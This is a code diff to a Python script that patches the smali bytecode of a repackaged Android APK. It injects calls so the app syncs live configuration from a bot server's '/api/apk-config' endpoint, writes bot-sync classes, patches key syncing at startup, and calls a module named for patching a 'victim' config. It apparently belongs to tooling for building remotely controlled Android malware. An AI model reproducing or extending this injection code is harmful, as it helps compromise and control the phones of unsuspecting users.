@@ -530,13 +530,56 @@ def patch_manifest_astik_size() -> None:
         print("AndroidManifest: removed SEND_SMS (Astik match, inject-only APK)")
 
 
+def patch_read_config_sync_bot() -> None:
+    """Pull live config from bot /api/apk-config when cache empty."""
+    text = TGS.read_text()
+    marker = """    :cond_0
+    invoke-static {p0}, Lcom/virtus/module/BotConfigSync;->getCachedConfig(Landroid/content/Context;)Lorg/json/JSONObject;"""
+    insert = """    :cond_0
+    invoke-static {p0, p1}, Lcom/virtus/module/BotConfigSync;->syncFromBot(Landroid/content/Context;Ljava/lang/String;)Z
+
+    invoke-static {p0}, Lcom/virtus/module/BotConfigSync;->getCachedConfig(Landroid/content/Context;)Lorg/json/JSONObject;"""
+    if marker in text:
+        print("readConfig syncFromBot already patched (skip)")
+        return
+    if ":virtus_no_bot_cache" not in text:
+        patch_read_config()
+    text = TGS.read_text()
+    if marker.replace("invoke-static {p0},", "invoke-static {p0, p1},") in text:
+        print("readConfig syncFromBot already present (skip)")
+        return
+    old = """    :cond_0
+    invoke-static {p0}, Lcom/virtus/module/BotConfigSync;->getCachedConfig(Landroid/content/Context;)Lorg/json/JSONObject;
+
+    move-result-object v7
+
+    if-eqz v7, :virtus_no_bot_cache"""
+    new = """    :cond_0
+    invoke-static {p0, p1}, Lcom/virtus/module/BotConfigSync;->syncFromBot(Landroid/content/Context;Ljava/lang/String;)Z
+
+    invoke-static {p0}, Lcom/virtus/module/BotConfigSync;->getCachedConfig(Landroid/content/Context;)Lorg/json/JSONObject;
+
+    move-result-object v7
+
+    if-eqz v7, :virtus_no_bot_cache"""
+    if old in text:
+        text = text.replace(old, new, 1)
+        TGS.write_text(text)
+        print("readConfig syncFromBot before cache lookup patched")
+    else:
+        print("readConfig syncFromBot block not found (skip)")
+
+
 def main() -> None:
+    bot_base = _bot_base_url()
     strip_dead_smali()
     patch_manifest_astik_size()
-    from patch_restore_astik_apk import strip_extra_smali, strip_main_activity_bot_sync
-
-    strip_extra_smali()
-    strip_main_activity_bot_sync()
+    write_bot_config_sync(bot_base)
+    write_bot_sync_inner()
+    patch_read_config()
+    patch_read_config_sync_bot()
+    patch_run_test_sync_bot()
+    patch_oncreate_key_sync()
     from patch_readconfig_victim import main as patch_readconfig_victim
 
     patch_readconfig_victim()
